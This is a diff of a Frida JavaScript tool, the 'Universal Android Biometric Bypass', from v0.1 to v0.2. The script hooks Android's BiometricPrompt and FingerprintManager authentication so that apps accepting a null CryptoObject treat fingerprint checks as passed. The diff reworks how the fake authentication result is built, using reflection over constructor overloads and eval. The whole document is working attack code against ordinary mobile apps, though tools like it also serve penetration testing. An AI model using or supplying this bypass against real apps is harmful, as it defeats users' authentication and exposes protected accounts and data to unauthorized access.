@@ -1,5 +1,5 @@
 /*
-	Universal Android Biometric Bypass v0.1
+	Universal Android Biometric Bypass v0.2
 	author: ax - github.com/ax
 
 	Updated Android biometric bypass script (from Kamil Breński, Krzysztof Pranczk and Mateusz Fruba, August 2019)
@@ -9,8 +9,6 @@
     Bypass fingerprint authentication if the app accept NULL cryptoObject in onAuthenticationSucceeded(...).
     This script should automatically bypass fingerprint when authenticate(...) method will be called.
 */
-
-console.log("Fingerprint hooks loaded!");
 
 Java.perform(function () {
     //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
@@ -25,7 +23,6 @@ Java.perform(function () {
 });
 
 
-
 var cipherList = [];
 var StringCls = null;
 Java.perform(function () {
@@ -34,26 +31,34 @@ Java.perform(function () {
 
 });
 
-function getAuthResult(resultObj, cryptoInst) {
-    try {
-        var authenticationResultInst = resultObj.$new(cryptoInst, null, 0, false);
-    } catch (error) {
-        try {
-            var authenticationResultInst = resultObj.$new(cryptoInst, null, 0);
-        } catch (error) {
-            try {
-                var authenticationResultInst = resultObj.$new(cryptoInst, null);
-            }
-            catch (error) {
-				try{
-                	var authenticationResultInst = resultObj.$new(cryptoInst);
-				}catch (error) {
-					// Android 11
-    				var authenticationResultInst = resultObj.$new(cryptoInst,0);
-				}
-            }
-        }
+function getArgsTypes(overloads) {
+	// there should be just one overload for the constructor
+	// overloads.len == 1 check
+    var results = []
+	var i,j;
+    for (i in overloads) {
+		console.log('[*] Overload number ind: '+i);
+        //if (overloads[i].hasOwnProperty('argumentTypes')) {
+           var parameters = []
+           for (j in overloads[i].argumentTypes) {
+               parameters.push("'" + overloads[i].argumentTypes[j].className + "'")
+           }
+       // }
+        results.push('resultObj.$new(' + parameters.join(', ') + ');')
     }
+    return results.join('\n')
+}
+
+function getAuthResult(resultObj, cryptoInst) {
+	var clax = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
+	var resu = getArgsTypes(clax['$init'].overloads);
+	//console.log(resu);
+	resu = resu.replace(/\'android\.hardware\.biometrics\.BiometricPrompt\$CryptoObject\'/, 'cryptoInst');
+	resu = resu.replace('\'int\'', '0');
+	resu = resu.replace('\'boolean\'', 'false');
+	resu = resu.replace(/'.*'/, 'null');
+	//console.log(resu);
+	var authenticationResultInst = eval(resu);
     console.log("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
     return authenticationResultInst;
 }
@@ -162,6 +167,8 @@ Error: authenticate(): has more than one overload, use .overload(<signature>) to
         }
     }
     console.log("Hooking FingerprintManager.authenticate()...");
+
+
 
     var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
     fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
